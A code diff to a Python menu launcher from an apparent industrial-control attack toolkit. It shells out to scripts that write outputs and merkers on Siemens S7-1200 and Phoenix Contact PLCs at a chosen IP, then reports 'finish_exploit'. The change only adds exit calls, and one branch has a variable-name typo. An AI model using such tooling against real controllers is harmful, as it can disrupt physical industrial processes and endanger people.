@@ -227,7 +227,7 @@ def menu9():
     else:
         subprocess.Popen("%s/PhoenixControlPLC-ILC150.py %s " %
                          (path, ip), shell=True).wait()
-
+        sys.exit()
 
 def menu10():
     IP()
@@ -246,48 +246,54 @@ def menu10():
     merker = raw_input(warna.biru + "[+] " + warna.tutup + " Set the merkers" + warna.kuning + "  >>  " + warna.tutup)
     print(warna.kuning + '\n[!] ' + warna.tutup + ' Example set output : "00000000"')
     output = raw_input(warna.biru + "[+] " + warna.tutup + " Set outputs" + warna.kuning + "  >>  " + warna.tutup)
-    if output == '' and port == '' and merker =='':
+    if output == '' and merker =='' and port =='':
         subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p 102 -r " %
                          (path, ip), shell=True).wait()
         finish_exploit()
         back.menu['menu_utama']()
+        sys.exit()
 
     if port == '' and merker =='':
         subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p 102 -o %s " %
                          (path, ip, output), shell=True).wait()
         finish_exploit()
         back.menu['menu_utama']()
+        sys.exit()
 
     if port == '' and output == '':
         subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p 102 -m %s " %
                          (path, ip, merker), shell=True).wait()
         finish_exploit()
         back.menu['menu_utama']()
+        sys.exit()
 
     elif merker =='' and output == '':
         subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p %s -r " %
                          (path, ip, port), shell=True).wait()
         finish_exploit()
         back.menu['menu_utama']()
+        sys.exit()
 
     elif merker =='':
         subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p %s -o %s " %
                          (path, ip, port, output), shell=True).wait()
         finish_exploit()
         back.menu['menu_utama']()
+        sys.exit()
 
     elif output == '':
         subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p %s -m %s " %
                          (path, ip, port, marker), shell=True).wait()
         finish_exploit()
         back.menu['menu_utama']()
+        sys.exit()
 
     else:
         subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p %s -o %s -m %s " %
                          (path, ip, port, output, merker), shell=True).wait()
         finish_exploit()
         back.menu['menu_utama']()
-
+        sys.exit()
 
 def menu11():
     IP()
